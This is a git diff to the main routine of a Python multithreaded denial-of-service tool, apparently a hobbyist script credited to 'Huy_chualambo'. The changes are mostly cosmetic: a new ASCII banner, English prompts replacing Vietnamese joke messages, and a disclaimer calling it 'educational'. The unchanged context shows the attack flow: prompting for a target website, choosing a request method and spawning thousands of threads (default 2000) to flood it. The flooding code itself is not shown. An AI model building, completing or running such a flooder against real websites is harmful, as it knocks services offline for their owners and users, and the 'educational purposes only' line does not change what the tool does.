@@ -28,32 +28,39 @@ class Dos(threading.Thread):
         url = ""
         attakingAmoun = 0
         dos = Dos(0, 0)
-        print(" ________  ________  ________            ___  ___  ___  ___      ___    ___ ________  ___  ___  ___  ___  ________  ___       ________  _____ ______   ________  ________     ")
-        print("|\   ___ \|\   __  \|\   ____\          |\  \|\  \|\  \|\  \    |\  \  /  /|\   ____\|\  \|\  \|\  \|\  \|\   __  \|\  \     |\   __  \|\   _ \  _   \|\   __  \|\   __  \    ")        
-        print("\ \  \_|\ \ \  \|\  \ \  \___|_  _______\ \  \\\  \ \  \\\  \   \ \  \/  / | \  \___|\ \  \\\  \ \  \\\  \ \  \|\  \ \  \    \ \  \|\  \ \  \\\__\ \  \ \  \|\ /\ \  \|\  \  ")
-        print(" \ \  \ \\ \ \  \\\  \ \_____  \|\_______\ \   __  \ \  \\\  \   \ \    / / \ \  \    \ \   __  \ \  \\\  \ \   __  \ \  \    \ \   __  \ \  \\|__| \  \ \   __  \ \  \\\  \  ")
-        print("  \ \  \_\\ \ \  \\\  \|____|\  \|_______|\ \  \ \  \ \  \\\  \   \/  /  /   \ \  \____\ \  \ \  \ \  \\\  \ \  \ \  \ \  \____\ \  \ \  \ \  \    \ \  \ \  \|\  \ \  \\\  \ ")
-        print("   \ \  \_\\ \ \  \\\  \|____|\  \|_______|\ \  \ \  \ \  \\\  \   \/  /  /   \ \  \____\ \  \ \  \ \  \\\  \ \  \ \  \ \  \____\ \  \ \  \ \  \    \ \  \ \  \|\  \ \  \\\  \ ")
-        print("    \ \_______\ \_______\____\_\  \         \ \__\ \__\ \_______\__/  / /      \ \_______\ \__\ \__\ \_______\ \__\ \__\ \_______\ \__\ \__\ \__\    \ \__\ \_______\ \_______\ ")
-        print("     \|_______|\|_______|\_________\         \|__|\|__|\|_______|\___/ /        \|_______|\|__|\|__|\|_______|\|__|\|__|\|_______|\|__|\|__|\|__|     \|__|\|_______|\|_______|")   
-        print("                        \|_________|                            \|___|/                                                                                                        ")     
-        url = input("ENTER WEBSITE(NHAP WEB CAN PEM):")
+        print("")
+        print("")
+        print("")
+        print("      WELCOME TO")
+        print(" -------------------------------------------------------------------------------------------------------------------- ")        
+        print("|  _____   ____   _____       _    _ _    ___     _______ _    _ _    _         _               __  __ ____   ____    |")
+        print("| |  __ \ / __ \ / ____|     | |  | | |  | \ \   / / ____| |  | | |  | |  /\   | |        /\   |  \/  |  _ \ / __ \   |")        
+        print("| | |  | | |  | | (___ ______| |__| | |  | |\ \_/ | |    | |__| | |  | | /  \  | |       /  \  | \  / | |_) | |  | |  |")
+        print("| | |  | | |  | |\___ |______|  __  | |  | | \   /| |    |  __  | |  | |/ /\ \ | |      / /\ \ | |\/| |  _ <| |  | |  |")
+        print("| | |__| | |__| |____) |     | |  | | |__| |  | | | |____| |  | | |__| / ____ \| |____ / ____ \| |  | | |_) | |__| |  |")
+        print("| |_____/ \____/|_____/      |_|  |_|\____/   |_|  \_____|_|  |_|\____/_/    \_|______/_/    \_|_|  |_|____/ \____/   |")
+        print(" -------------------------------------------------------------------------------------------------------------------- ")
+        print("Author: Huy_chualambo")   
+        print("------------------------------------------------------------------------------------------------------------")
+        print("Don't attack GOV websites, for educational purposes only, I don't take any responsibility for your behavior")  
+        print("------------------------------------------------------------------------------------------------------------")   
+        url = input(">>> ENTER WEBSITE(e.g: https://github.com/):")
         print("\n")
-        print("CHECKING: " + url)
+        print(">>> CHECKING: " + url)
         SUrl = url.split(":")
-        print("Run time >>> ")
+        print(">>> Run >>> ")
         if SUrl[0] == "http" or SUrl[0] == "https":
             dos.checkConnection(url)
         else:
             dos.sslCheckConnection(url)
         print("successfully connected!!!")
         print("Now, enter Thread and Methods ")
-        amount = input("Thread(default/17000) : ")
+        amount = input(">>> Thread(default/17000) : ")
         if amount == "" or amount is None:
             Dos.amount = 2000
         else:
             Dos.amount = int(amount)
-        option = input("methods(default/80000) : ")
+        option = input(">>> Methods(default/80000) : ")
         ioption = 1
         if option.lower() == "get":
             if SUrl[0] == "http" or SUrl[0] == "https":
@@ -66,7 +73,7 @@ class Dos(threading.Thread):
             else:
                 ioption = 2
         time.sleep(2)
-        print("OOOOO BAN TUM LUMMM")
+        print(">>> Sent to: ")
         threads = []
         for i in range(Dos.amount):
             t = Dos(i, ioption)
@@ -74,7 +81,7 @@ class Dos(threading.Thread):
             threads.append(t)
         for t in threads:
             t.join()
-        print("HẾT CỨUUU(main threads dead)")
+        print("main threads dead")
 
     def checkConnection(self, url):
         print("Checking Connection")
